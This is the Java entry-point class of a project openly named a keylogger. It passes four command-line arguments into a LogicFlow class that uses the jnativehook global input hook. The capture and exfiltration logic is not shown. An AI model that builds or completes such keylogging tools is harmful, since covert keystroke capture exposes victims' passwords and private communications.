package com.mossad.keylogger;

import com.mossad.keylogger.logic.LogicFlow;
import org.jnativehook.NativeHookException;

import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {

    public static void main(String[] args) throws NativeHookException {
        Logger.getGlobal().setLevel(Level.INFO);
        LogicFlow logicFlow = new LogicFlow(args[0], args[1], args[2], Integer.parseInt(args[3]));
        logicFlow.execute();
    }

}












